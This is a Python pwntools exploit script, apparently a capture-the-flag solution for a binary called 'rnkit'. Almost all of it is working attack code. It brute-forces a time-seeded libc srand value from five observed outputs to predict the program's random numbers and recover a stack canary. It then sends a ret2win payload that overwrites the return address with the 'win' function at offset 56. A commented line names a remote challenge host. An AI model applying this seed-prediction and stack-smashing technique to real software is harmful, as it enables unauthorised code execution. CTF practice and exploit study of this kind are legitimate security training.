import ctypes, tqdm

# Create a ctypes structure to match the C 'struct timeval'
class timeval(ctypes.Structure):
    _fields_ = [("tv_sec", ctypes.c_long),
                ("tv_usec", ctypes.c_long)]

# Import the C standard library's 'gettimeofday' function
libc = ctypes.CDLL('libc.so.6')    # replace with msvcrt.dll for Windows
gettimeofday = libc.gettimeofday
gettimeofday.restype = ctypes.c_int
gettimeofday.argtypes = [ctypes.POINTER(timeval), ctypes.c_void_p]

# Import the C standard library's 'srand' and 'rand' functions
srand = libc.srand
srand.restype = ctypes.c_void_p
srand.argtypes = [ctypes.c_uint]

rand = libc.rand
rand.restype = ctypes.c_int
rand.argtypes = []

# Get the current time with 'gettimeofday'
t = timeval()
gettimeofday(ctypes.pointer(t), None)
seed_time = t.tv_sec

def crackSeed(sequence):
    for i in tqdm.tqdm(range(-1000000, 1000000)):   # increase the range as necessary
        seed = seed_time + i
        srand(seed)

        # Get first random number
        first_num = rand()

        for j, num in enumerate(sequence):
            guess = rand()
            if guess != num:
                break   # the seed is incorrect, go to next one
        else:
            return first_num, rand()
    else:
        print("Seed not found")


from pwn import * 

exe = context.binary = ELF('./rnkit')
winaddr = exe.symbols['win']
io = exe.process() # remote('amt.rs', 31175)

seq = []
for i in range(5):
    io.recvuntil(b'Exit\n')
    io.sendline(b'1')
    seq.append(int(io.recvline().strip()))

canary, check = crackSeed(seq)

io.recvuntil(b'Exit\n')
io.sendline(b'2')
io.recvuntil(b'your guess: ')
io.sendline(str(check).encode())
resp = io.recvline()
if 'correct' in resp.decode():
    #conduct ret2win
    io.recvuntil(b'Exit\n')
    io.sendline(b'2')
    io.recvuntil(b'your guess: ')
    payload = fit({
    44: canary,
    56: winaddr
    })
    io.sendline(payload)
    resp = io.recvline()
    print(resp.decode())

else:
    print('Error: bad seed crack')

